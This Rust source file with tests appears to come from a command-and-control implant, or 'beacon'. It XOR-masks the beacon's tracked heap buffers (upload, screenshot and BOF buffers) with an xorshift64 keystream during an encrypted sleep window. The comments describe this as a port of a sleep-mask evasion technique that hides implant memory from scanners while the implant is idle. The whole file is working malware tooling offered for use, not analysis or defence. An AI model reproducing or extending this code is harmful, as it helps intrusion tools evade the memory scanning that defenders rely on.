//! Private-heap masking for the encrypted sleep window (the Astral
//! Projection half of the original's sleep.c: the beacon's own heap
//! buffers are XOR-masked while the image mask sleeps).
//!
//! Same byte-oriented xorshift64 keystream as the image mask
//! (`sleepmask`), with its own per-cycle seed: the transform is an
//! involution, so masking twice with the same seed restores the bytes.
//! Pure and host-tested; the beacon applies it to the raw heap ranges it
//! tracks (upload/screenshot/BOF buffers), never to the whole process
//! heap (foreign threads may allocate there during the window).

/// One heap range to mask: `ptr..ptr+len`. Zero-length ranges are skipped.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct HeapRange {
    pub ptr: usize,
    pub len: usize,
}

/// Max ranges masked per sleep cycle (upload + screenshot + BOF queue +
/// donor context + slack).
pub const MAX_HEAP_RANGES: usize = 8;

/// One keystream byte, identical to the sleep-stub asm stream (state
/// advances per byte, output is the low byte, then the state shifts).
#[inline]
fn stream_next(state: &mut u64) -> u8 {
    *state ^= *state << 13;
    *state ^= *state >> 7;
    *state ^= *state << 17;
    let b = *state as u8;
    *state >>= 8;
    b
}

/// XOR-mask every range in place with the keystream from `seed`.
/// Self-inverse: calling it twice with the same seed and ranges restores
/// the original bytes.
///
/// # Safety
///
/// Each `ptr..ptr+len` must be mapped and writable for the whole call;
/// ranges must not overlap the executing code.
pub unsafe fn mask_ranges(ranges: &[HeapRange], seed: u64) {
    let mut state = if seed == 0 {
        0x9E37_79B9_7F4A_7C15
    } else {
        seed
    };
    let mut i = 0;
    while i < ranges.len() {
        let r = ranges[i];
        if r.len > 0 && r.ptr != 0 {
            let buf = core::slice::from_raw_parts_mut(r.ptr as *mut u8, r.len);
            let mut j = 0;
            while j < buf.len() {
                buf[j] ^= stream_next(&mut state);
                j += 1;
            }
        }
        i += 1;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rng::XorShift64;
    use std::prelude::v1::*;
    use std::vec;
    use std::vec::Vec;

    #[test]
    fn mask_is_self_inverse_per_range() {
        let mut a = [0xABu8; 100];
        let mut b = [0x5Cu8; 37];
        let orig_a = a;
        let orig_b = b;
        let ranges = [
            HeapRange {
                ptr: a.as_mut_ptr() as usize,
                len: a.len(),
            },
            HeapRange {
                ptr: b.as_mut_ptr() as usize,
                len: b.len(),
            },
        ];
        unsafe {
            mask_ranges(&ranges, 0xDEAD_BEEF);
            assert_ne!(a, orig_a);
            assert_ne!(b, orig_b);
            mask_ranges(&ranges, 0xDEAD_BEEF);
            assert_eq!(a, orig_a);
            assert_eq!(b, orig_b);
        }
    }

    #[test]
    fn stream_is_continuous_across_ranges() {
        // One range split in two must mask identically to the whole range:
        // the keystream does not restart per range.
        let mut whole = [0u8; 64];
        let mut split = [0u8; 64];
        for b in whole.iter_mut() {
            *b = 0x11;
        }
        split.copy_from_slice(&whole);
        let rw = HeapRange {
            ptr: whole.as_mut_ptr() as usize,
            len: 64,
        };
        let half = whole.len() / 2;
        let rs = [
            HeapRange {
                ptr: split.as_mut_ptr() as usize,
                len: half,
            },
            HeapRange {
                ptr: unsafe { split.as_mut_ptr().add(half) } as usize,
                len: 64 - half,
            },
        ];
        unsafe {
            mask_ranges(&[rw], 42);
            mask_ranges(&rs, 42);
        }
        assert_eq!(whole, split);
    }

    #[test]
    fn empty_and_null_ranges_are_skipped() {
        let mut data = [0x77u8; 8];
        let orig = data;
        let ranges = [
            HeapRange { ptr: 0, len: 16 },
            HeapRange {
                ptr: data.as_mut_ptr() as usize,
                len: 0,
            },
        ];
        unsafe {
            mask_ranges(&ranges, 1);
        }
        assert_eq!(data, orig);
        // Zero seed is remapped, not stuck.
        let r = [HeapRange {
            ptr: data.as_mut_ptr() as usize,
            len: 8,
        }];
        unsafe {
            mask_ranges(&r, 0);
            assert_ne!(data, orig);
            mask_ranges(&r, 0);
            assert_eq!(data, orig);
        }
    }

    #[test]
    fn hostile_range_fuzz_round_trips() {
        let mut backing = vec![0xC3u8; 4096];
        let mut rng = XorShift64::new(0xA57A1);
        let mut it = 0;
        while it < 5000 {
            let mut ranges: Vec<HeapRange> = Vec::new();
            let n = 1 + (rng.next_u64() as usize) % MAX_HEAP_RANGES;
            let mut k = 0;
            while k < n {
                let off = (rng.next_u64() as usize) % backing.len();
                let len = (rng.next_u64() as usize) % (backing.len() - off + 1);
                ranges.push(HeapRange {
                    ptr: unsafe { backing.as_mut_ptr().add(off) } as usize,
                    len,
                });
                k += 1;
            }
            let orig = backing.clone();
            let seed = rng.next_u64();
            unsafe {
                mask_ranges(&ranges, seed);
                mask_ranges(&ranges, seed);
            }
            assert_eq!(backing, orig);
            it += 1;
        }
    }
}
